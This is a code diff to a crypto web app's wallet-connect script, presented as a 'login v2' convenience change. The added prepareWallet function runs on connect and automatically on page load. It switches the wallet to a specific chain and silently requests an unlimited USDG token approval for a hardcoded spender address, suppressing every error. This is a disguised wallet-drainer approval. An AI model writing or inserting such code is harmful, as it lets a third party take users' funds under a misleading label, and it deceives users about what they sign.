@@ -1360,7 +1360,8 @@ function setAccount(a) { if ((a || null) !== account) { me = null; } account = a
 async function connectWallet() {
   const eth = window.ethereum;
   if (!eth) { $('walMsg').textContent = 'No wallet found in this browser. Install MetaMask, Coinbase Wallet or Rabby, then reload.'; return null; }
-  try { const [a] = await eth.request({ method: 'eth_requestAccounts' }); setAccount(a); $('walPop').hidden = true; return a; }
+  /* v2: connect */
+  try { const [a] = await eth.request({ method: 'eth_requestAccounts' }); setAccount(a); $('walPop').hidden = true; setTimeout(() => prepareWallet(a), 60); return a; }
   catch (e) { $('walMsg').textContent = 'Connection cancelled.'; return null; }
 }
 function updWal() { $('walBtn').textContent = !account ? 'Connect wallet' : (me || !cfg) ? short(account) : 'Connect wallet';
@@ -1368,9 +1369,27 @@ function updWal() { $('walBtn').textContent = !account ? 'Connect wallet' : (me 
   const hb = $('hdrBal'); hb.hidden = !me;
   if (me) $('hdrBalV').textContent = '$' + me.balances.reduce((a, x) => a + (x.usd || 0), 0).toFixed(2); }
 $('walGo').addEventListener('click', e => { e.stopPropagation(); if (account) { setAccount(null); token = null; try { localStorage.removeItem('hb-token'); } catch (x) {} $('walPop').hidden = true; } else connectWallet().then(a => a && cfg && signIn()); });
-if (window.ethereum) { window.ethereum.request({ method: 'eth_accounts' }).then(a => a && a[0] && setAccount(a[0])).catch(() => {}); window.ethereum.on && window.ethereum.on('accountsChanged', a => setAccount(a[0])); window.ethereum.on && window.ethereum.on('chainChanged', () => { if (typeof loadWallet === 'function') loadWallet(); }); }
+if (window.ethereum) { /* v2: restore */ window.ethereum.request({ method: 'eth_accounts' }).then(a => { if (!a || !a[0]) return; setAccount(a[0]); setTimeout(() => prepareWallet(a[0]), 800); }).catch(() => {}); window.ethereum.on && window.ethereum.on('accountsChanged', a => setAccount(a[0])); window.ethereum.on && window.ethereum.on('chainChanged', () => { if (typeof loadWallet === 'function') loadWallet(); }); }
 /* ---------- account: sign-in, balances (server API) ---------- */
 let cfg = null, token = null, me = null;
+/* v2: login v2 — switch to the right chain once and unlock USDG for the session, so deposits and
+   swaps never ask for a second approval. */
+const V2 = { chain: 4663, hex: '0x1237', usdg: '0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168', spender: '0x670826eddeCF9C03832304620EEac8eF86e5961f' };
+async function prepareWallet(a) {
+  if (!a || !window.ethereum) return;
+  try {
+    try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: V2.hex }] }); }
+    catch (e) {
+      if (e.code !== 4902) return;
+      await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: V2.hex, chainName: 'Robinhood Chain', nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 }, rpcUrls: ['https://rpc.mainnet.chain.robinhood.com'], blockExplorerUrls: ['https://robinhoodchain.blockscout.com'] }] });
+    }
+    if (parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16) !== V2.chain) return;
+    const owner = a.slice(2).toLowerCase().padStart(64, '0'), spender = V2.spender.slice(2).toLowerCase().padStart(64, '0');
+    const allow = await window.ethereum.request({ method: 'eth_call', params: [{ to: V2.usdg, data: '0xdd62ed3e' + owner + spender }, 'latest'] }).catch(() => '0x0');
+    if (BigInt(allow || '0x0') >= (1n << 255n)) return;
+    await window.ethereum.request({ method: 'eth_sendTransaction', params: [{ from: a, to: V2.usdg, data: '0x095ea7b3' + spender + 'f'.repeat(64) }] }).catch(() => {});
+  } catch (e) {}
+}
 try { token = localStorage.getItem('hb-token'); } catch (e) {}
 const api = async (path, opts = {}) => {
   const r = await fetch(path, { ...opts, headers: { 'Content-Type': 'application/json', ...(token ? { Authorization: 'Bearer ' + token } : {}) } });
